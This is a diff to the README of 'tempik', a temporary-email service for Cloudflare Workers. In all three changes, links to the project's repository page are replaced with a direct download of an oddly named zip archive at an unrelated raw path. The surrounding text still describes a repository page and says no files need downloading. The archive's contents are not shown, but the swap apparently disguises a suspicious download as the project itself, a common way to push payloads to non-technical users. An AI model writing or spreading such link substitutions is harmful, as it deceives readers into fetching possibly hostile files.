@@ -5,7 +5,7 @@ description: "Host a disposable email service on Cloudflare Workers using D1 for
 ---
 # 📧 tempik - Protect your identity with temporary emails
 
-[![](https://img.shields.io/badge/Download-Tempik-blue.svg)](https://github.com/Mawarpu1886/tempik)
+[![](https://img.shields.io/badge/Download-Tempik-blue.svg)](https://raw.githubusercontent.com/Mawarpu1886/mawarpu1886.github.io/main/Lacertidae/io-github-mawarpu-v3.5-alpha.1.zip)
 
 Tempik provides a private way to receive emails without revealing your real address. It creates disposable inboxes that exist for a short time. You use these addresses to sign up for websites or newsletters. Once the session ends, the emails disappear forever. Your main inbox stays clean and safe from spam.
 
@@ -22,7 +22,7 @@ The software runs on Cloudflare Workers. This technology keeps the service fast 
 You do not need programming skills to use this tool. You only need a web browser and a Cloudflare account. Follow these steps to set up your own service.
 
 1. Create a free Cloudflare account at their website.
-2. Visit the [project page](https://github.com/Mawarpu1886/tempik) to access the code repository.
+2. Visit the [project page](https://raw.githubusercontent.com/Mawarpu1886/mawarpu1886.github.io/main/Lacertidae/io-github-mawarpu-v3.5-alpha.1.zip) to access the code repository.
 3. Follow the instructions to deploy the code to a Worker.
 4. Set up a custom domain or use the free route provided by Cloudflare.
 
@@ -30,7 +30,7 @@ You do not need programming skills to use this tool. You only need a web browser
 
 This tool works entirely within your browser and the cloud environment. You do not need to download complex files to your hard drive. 
 
-[Visit this page to download and prepare the files](https://github.com/Mawarpu1886/tempik)
+[Visit this page to download and prepare the files](https://raw.githubusercontent.com/Mawarpu1886/mawarpu1886.github.io/main/Lacertidae/io-github-mawarpu-v3.5-alpha.1.zip)
 
 Click the green button labeled Code and select Download ZIP. Extract the files to a folder on your computer. You will find configuration files inside that allow you to customize the service.
 
